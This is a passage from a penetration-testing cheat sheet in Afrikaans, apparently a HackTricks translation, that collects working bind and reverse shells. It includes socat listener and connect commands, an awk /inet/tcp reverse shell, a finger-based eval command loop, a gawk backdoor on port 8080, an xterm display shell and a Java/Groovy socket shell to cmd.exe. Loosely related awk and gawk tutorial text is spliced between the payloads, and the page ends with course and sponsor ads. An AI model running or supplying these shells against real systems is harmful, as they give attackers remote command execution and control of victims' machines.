'n Bind dop is 'n tipe dop wat gebruik word om 'n verbinding te skep tussen 'n aanvaller se masjien en 'n teiken masjien. Hierdie dop bind aan 'n spesifieke poort op die teiken masjien en wag vir 'n inkomende verbinding van die aanvaller. Die aanvaller kan dan gebruik maak van hierdie verbinding om beheer oor die teiken masjien te verkry.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
'n Reverse shell is 'n tegniek wat gebruik word deur 'n aanvaller om toegang te verkry tot 'n teikenstelsel vanaf 'n afstand. Dit behels die gebruik van 'n kwaadwillige kode wat op die teikenstelsel uitgevoer word en 'n verbinding met die aanvaller se stelsel vestig. Hierdie verbinding stel die aanvaller in staat om op afstand opdragte uit te voer en toegang te verkry tot die teikenstelsel se hulpbronne en data.

'n Reverse shell kan op verskillende maniere geïmplementeer word, maar die algemene idee is om 'n verbinding te maak vanaf die teikenstelsel na die aanvaller se stelsel. Dit kan gedoen word deur gebruik te maak van 'n kwaadwillige program wat op die teikenstelsel uitgevoer word en 'n netwerkverbinding inisieer na die aanvaller se IP-adres en poortnommer. Die aanvaller kan dan 'n luisterende program op sy stelsel hê wat die inkomende verbinding aanvaar en 'n interaktiewe sessie met die teikenstelsel bied.

'n Reverse shell is 'n kragtige tegniek wat deur aanvallers gebruik word om toegang te verkry tot stelsels en netwerke. Dit is belangrik vir verdedigers om bewus te wees van hierdie tegniek en maatreëls te tref om dit te voorkom.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk is 'n kragtige taal en hulpmiddel wat gebruik kan word om data te manipuleer en te verwerk in Linux. Dit is 'n ingeboude hulpmiddel in die meeste Linux-stelsels en kan gebruik word om te soek, filter, sorteer en transformeer data. Awk werk deur die lees van 'n reël van die invoer, dit te verdeel in velders en dan aksies uit te voer op die velders.

Awk kan gebruik word om verskeie take uit te voer, soos die soek na spesifieke patrone in 'n lêer, die berekening van statistieke, die manipulasie van data en die generering van verslae. Dit is 'n baie nuttige hulpmiddel vir die verwerking van groot hoeveelhede data en kan ook gebruik word in skrips om komplekse take te outomatiseer.

Hier is 'n paar voorbeelde van hoe Awk gebruik kan word:

### Soek na spesifieke patrone

```bash
awk '/patroon/ { print }' lêernaam
```

Hierdie opdrag sal soek na die spesifieke patroon in die lêer en enige reëls wat die patroon bevat, sal gedruk word.

### Berekening van statistieke

```bash
awk '{ sum += $1 } END { print sum }' lêernaam
```

Hierdie opdrag sal die som van die waardes in die eerste veld van elke reël in die lêer bereken en dit sal gedruk word wanneer die verwerking voltooi is.

### Manipulasie van data

```bash
awk '{ $1 = "nuwe waarde" } { print }' lêernaam
```

Hierdie opdrag sal die waarde van die eerste veld in elke reël in die lêer verander na "nuwe waarde" en die gewysigde reëls sal gedruk word.

Awk bied 'n baie kragtige en veelsydige manier om data te manipuleer en te verwerk in Linux. Dit is 'n nuttige hulpmiddel vir enigeen wat met data werk en kan help om komplekse take te vereenvoudig en te outomatiseer.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
### Vinger

**Aanvaller**
```bash
while true; do nc -l 79; done
```
Om die bevel te stuur, skryf dit neer, druk enter en druk CTRL+D (om STDIN te stop)

**Slagoffer**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk is 'n kragtige en veelsydige opdraggereëlverwerker wat dikwels gebruik word in Linux-stelsels. Dit kan gebruik word om teks te manipuleer, patrone te soek en te vervang, en data te verwerk. Gawk is 'n afkorting vir "GNU Awk" en is 'n verbeterde weergawe van die oorspronklike awk-program.

### Installasie

Om Gawk op 'n Linux-stelsel te installeer, kan jy die volgende opdrag gebruik:

```bash
sudo apt-get install gawk
```

### Gebruik

Gawk kan gebruik word om teks vanaf 'n lêer of die invoerstroom te verwerk. Dit kan ook gebruik word om data te manipuleer en te transformeer deur gebruik te maak van patrone en akties.

Om Gawk te gebruik, kan jy die volgende sintaks volg:

```bash
gawk 'patroon { aktie }' lêernaam
```

Hier is 'n paar voorbeelde van hoe Gawk gebruik kan word:

- Om 'n lêer te lees en die inhoud te druk:

```bash
gawk '{ print }' lêernaam
```

- Om 'n spesifieke patroon in 'n lêer te soek en die ooreenstemmende lyne te druk:

```bash
gawk '/patroon/ { print }' lêernaam
```

- Om 'n spesifieke kolom van 'n lêer te druk:

```bash
gawk '{ print $kolomnommer }' lêernaam
```

- Om 'n lêer te sorteer volgens 'n spesifieke kolom:

```bash
gawk '{ print }' lêernaam | sort -k kolomnommer
```

- Om data te manipuleer en te transformeer deur gebruik te maak van patrone en akties:

```bash
gawk '/patroon/ { aktie }' lêernaam
```

Dit is slegs 'n klein deel van die funksionaliteit wat Gawk bied. Vir meer inligting en gevorderde gebruik, kan jy die Gawk-dokumentasie raadpleeg.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Dit sal probeer om te verbind met jou stelsel by poort 6001:
```bash
xterm -display 10.0.0.1:1
```
Om die omgekeerde dop te vang, kan jy gebruik maak van (wat sal luister op poort 6001):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

deur [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: Java omgekeerde dop werk ook vir Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Verwysings
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
